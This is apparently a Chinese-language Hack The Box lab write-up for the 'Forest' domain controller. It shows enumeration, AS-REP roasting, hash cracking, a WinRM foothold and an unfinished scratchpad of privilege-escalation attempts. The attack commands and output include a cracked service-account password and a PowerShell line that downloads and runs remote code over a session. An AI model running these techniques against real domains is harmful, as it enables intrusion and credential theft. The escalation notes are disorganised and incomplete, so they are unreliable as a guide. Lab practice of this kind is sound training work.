# 免责声明
>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责

# 服务探测
查看开放端口
```
┌──(root💀kali)-[~/htb/Forest]
└─# nmap -p- 10.10.10.161 --open               
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-04 08:31 EST
Nmap scan report for 10.10.10.161
Host is up (0.25s latency).
Not shown: 65364 closed ports, 147 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49671/tcp open  unknown
49676/tcp open  unknown
49677/tcp open  unknown
49684/tcp open  unknown
49706/tcp open  unknown
49928/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 130.98 seconds

```

查看详细信息
```
└─# nmap -sV -T4 -A -O 10.10.10.161 -p 53,88,135,139,389,445,464,593,636,3268,3269,585,9389,47001,49664,49665,49666,49667,49671,49676,49677,49684,49706,49928
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-04 08:35 EST
Nmap scan report for 10.10.10.161
Host is up (0.22s latency).

PORT      STATE  SERVICE      VERSION
53/tcp    open   domain       Simple DNS Plus
88/tcp    open   kerberos-sec Microsoft Windows Kerberos (server time: 2022-01-04 13:42:21Z)
135/tcp   open   msrpc        Microsoft Windows RPC
139/tcp   open   netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open   tcpwrapped
445/tcp   open   microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open   kpasswd5?
593/tcp   open   ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open   tcpwrapped
3268/tcp  open   ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open   tcpwrapped
9389/tcp  open   mc-nmf       .NET Message Framing
47001/tcp open   http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open   unknown
49665/tcp open   unknown
49666/tcp open   unknown
49667/tcp open   msrpc        Microsoft Windows RPC
49671/tcp open   unknown
49676/tcp open   ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open   msrpc        Microsoft Windows RPC
49684/tcp open   msrpc        Microsoft Windows RPC
49706/tcp open   msrpc        Microsoft Windows RPC
49928/tcp open   msrpc        Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=1/4%OT=53%CT=585%CU=39064%PV=Y%DS=2%DC=T%G=Y%TM=61D44D
OS:B8%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10D%TI=I%CI=I%TS=A)SEQ(SP=
OS:103%GCD=1%ISR=10D%TI=I%CI=I%II=I%SS=S%TS=A)OPS(O1=M505NW8ST11%O2=M505NW8
OS:ST11%O3=M505NW8NNT11%O4=M505NW8ST11%O5=M505NW8ST11%O6=M505ST11)WIN(W1=20
OS:00%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M5
OS:05NW8NNS%CC=Y%Q=)ECN(R=N)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%D
OS:F=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O
OS:=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W
OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
OS:T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%U
OS:N=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h46m51s, deviation: 4h37m10s, median: 6m49s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2022-01-04T05:43:43-08:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-01-04T13:43:42
|_  start_date: 2022-01-04T13:34:03

TRACEROUTE (using port 585/tcp)
HOP RTT       ADDRESS
1   257.15 ms 10.10.14.1
2   257.26 ms 10.10.10.161

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 162.40 seconds

```

显然是一台DC服务器，域名是：```htb.local```,机器名字：```FOREST```

先把域名加到host文件
```
echo "10.10.10.161  htb.local" >> /etc/hosts

```

使用rpcclient匿名登录靶机，枚举所有域用户
```
┌──(root💀kali)-[~/htb/Forest]
└─#  rpcclient -U "" -N 10.10.10.161                                                                           130 ⨯
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
rpcclient $> 

```

整理成一份user名单
```
Administrator
Guest
krbtgt
DefaultAccount
$331000-VK4ADACQNUCA
SM_2c8eef0a09b545acb
SM_ca8c2ed5bdab4dc9b
SM_75a538d3025e4db9a
SM_681f53d4942840e18
SM_1b41c9286325456bb
SM_9b69f1b9d2cc45549
SM_c75ee099d0a64c91b
SM_1ffab36a2f5f479cb
HealthMailboxc3d7722
HealthMailboxfc9daad
HealthMailboxc0a90c9
HealthMailbox670628e
HealthMailbox968e74d
HealthMailbox6ded678
HealthMailbox83d6781
HealthMailboxfd87238
HealthMailboxb01ac64
HealthMailbox7108a4e
HealthMailbox0659cc1
sebastien
lucinda
svc-alfresco
andy
mark
santi
```

使用```GetNPUsers.py```尝试向kerberos请求不需要预认证的票据
```
┌──(root💀kali)-[~/htb/Forest]
└─# python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py htb.local/ -usersfile /root/htb/Forest/user  -outputfile hashes.asreproast -dc-ip 10.10.10.161
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User HealthMailboxc3d7722 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxfc9daad doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxc0a90c9 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox670628e doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox968e74d doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox6ded678 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox83d6781 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxfd87238 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxb01ac64 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox7108a4e doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox0659cc1 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set

```


得到一个票据
```
┌──(root💀kali)-[~/htb/Forest]
└─# cat hashes.asreproast 
$krb5asrep$23$svc-alfresco@HTB.LOCAL:25119f5d1377a724caa46729ed033266$371a8d9e8f8913675cc79afc8e2e233a99fb375f45967e9999c7f3cd04c5cfdd427c52ebde622f0afe9a2a60f9c20bcac9bf8ac53807cf082eccef75b850ae3f07281f22bba083b10b97ea4a4bb7266618a1cbf92db7168d034789e3c5da54fec6adfbef667fbeff8d649f0c8b49183bf7bc188385e2e4589d482a1104787e1a079949cdc54a472a0a5ff79b59100a7a3c815830711404e829e7e3b9b984ffae71d7ab38a2ee88e5dc8916d8b28d63240d97c7e59daac9e8155ee13e64878ff9f7bf6d648d502f4d9ab3589faf4835ac659c315ff0e512a0104da788e586b07a46158b6e90b7

```


john爆破
```
┌──(root💀kali)-[~/htb/Forest]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt hashes.asreproast 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
s3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)
1g 0:00:00:03 DONE (2022-01-04 11:12) 0.2985g/s 1219Kp/s 1219Kc/s 1219KC/s s401447401447401447..s3r2s1
Use the "--show" option to display all of the cracked passwords reliably
Session completed

```


现在我们有了一个凭证：```svc-alfresco : s3rvice```

使用evil-winrm登录，拿到foodhold
```
┌──(root💀kali)-[~/htb/Forest]
└─# evil-winrm -i 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> whoami
htb\svc-alfresco

```

# 提权

```
*Evil-WinRM* PS C:\Users\svc-alfresco\Downloads> .\SharpHound.exe -c all --zipfilename forest.zip
----------------------------------------------
Initializing SharpHound at 2:23 AM on 1/5/2022
----------------------------------------------

Resolved Collection Methods: Group, Sessions, LoggedOn, Trusts, ACL, ObjectProps, LocalGroups, SPNTargets, Container

[+] Creating Schema map for domain HTB.LOCAL using path CN=Schema,CN=Configuration,DC=htb,DC=local
[+] Cache File Found! Loaded 209 Objects in cache

[+] Pre-populating Domain Controller SIDS
Status: 0 objects finished (+0) -- Using 23 MB RAM
Status: 123 objects finished (+123 61.5)/s -- Using 28 MB RAM
Enumeration finished in 00:00:02.4117046
Compressing data to .\20220105022302_forest.zip
You can upload this file directly to the UI

SharpHound Enumeration Completed at 2:23 AM on 1/5/2022! Happy Graphing!

*Evil-WinRM* PS C:\Users\svc-alfresco\Downloads> ls


    Directory: C:\Users\svc-alfresco\Downloads


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         1/5/2022   2:23 AM          15303 20220105022302_forest.zip
-a----         1/4/2022  10:47 PM         833024 SharpHound.exe

```

下载
```
*Evil-WinRM* PS C:\Users\svc-alfresco\Downloads> download C:\Users\svc-alfresco\Downloads\20220105022302_forest.zip
Info: Downloading C:\Users\svc-alfresco\Downloads\20220105022302_forest.zip to ./C:\Users\svc-alfresco\Downloads\20220105022302_forest.zip                                                                            

                                                             
Info: Download successful!


```

net group 

.\SharpHound.exe -c all --zipfilename forest.zip

download C:\Users\svc-alfresco\Downloads\20220105022302_forest.zip

smbmap -u "svc-alfresco" -p "s3rvice" -H 10.10.10.161

smbclient -U 'svc-alfresco%s3rvice' //10.10.10.161/SYSVOL

mount -t cifs -o 'username=svc-alfresco,password=s3rvice' //10.10.10.161/SYSVOL /mnt/SYSVOL

python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -request -dc-ip 10.10.10.161 htb.local/svc-alfresco  //不行

net group"svc-alfresco" /domain

python3 /usr/share/doc/python3-impacket/examples/secretsdump.py htb/svc-alfresco:s3rvice@10.10.10.161  //不行



evil-winrm -i 10.10.10.161 -u 'svc-alfresco' -p 's3rvice' -s '/root/PowerSploit/Recon'



lookupsid.py htb/svc-alfresco:s3rvice@10.10.10.161

psexec.py htb/svc-alfresco:s3rvice@10.10.10.161

rpcdump.py htb/svc-alfresco:s3rvice@10.10.10.161

samrdump.py htb/svc-alfresco:s3rvice@10.10.10.161

wmiexec.py htb/svc-alfresco:s3rvice@10.10.10.161

psexec.py htb/svc-alfresco:s3rvice@10.10.10.161


wmiexec.py forest.htb/svc-alfresco:s3rvice@10.10.10.161 

python3 smbexec.py forest.htb.local\svc-alfresco:s3rvice@10.10.10.161 
python3 psexec.py forest.htb.local\svc-alfresco:s3rvice@10.10.10.161 

sebastien

download C:\Users\svc-alfresco\Downloads\MzZhZTZmYjktOTM4NS00NDQ3LTk3OGItMmEyYTVjZjNiYTYw.bin 



python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py htb.local/   -dc-ip 10.10.10.161



GetNPUsers.py htb/svc-alfresco:s3rvice@10.10.10.161 -request -dc-ip 10.10.10.30



Find Shortest Paths to Domain Admins

AS-REP roastable users dontreqpreauth

Shortest Paths to Unconstrained Delegation Systems

Shortest Paths to High Value Targets

canpsremote
hassession

python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -request -dc-ip 10.10.10.161 htb.local/svc-alfresco

secretsdump.py -dc-ip 10.10.10.161 forest.htb.local/svc-alfresco:s3rvice@10.10.10.161

net view forest.htb.local

crackmapexec winrm  10.10.10.161 -u 'svc-alfresco' -p "s3rvice" -d "forest.htb.local"

evil-winrm -i 10.10.10.161 -u 'svc-alfresco' -p 's3rvice' --realm "forest.htb.local"

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force

$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)

$session = New-PSSession -ComputerName FOREST.HTB.LOCAL -Credential $Cred

net group "Account Operators" /domain



powershell $session = New-PSSession -ComputerName win-2016-001; Invoke-Command -Session $session -ScriptBlock {IEX ((new-object net.webclient).downloadstring('http://192.168.231.99:80/a'))}; Disconnect-PSSession -Session $session; Remove-PSSession -Session $session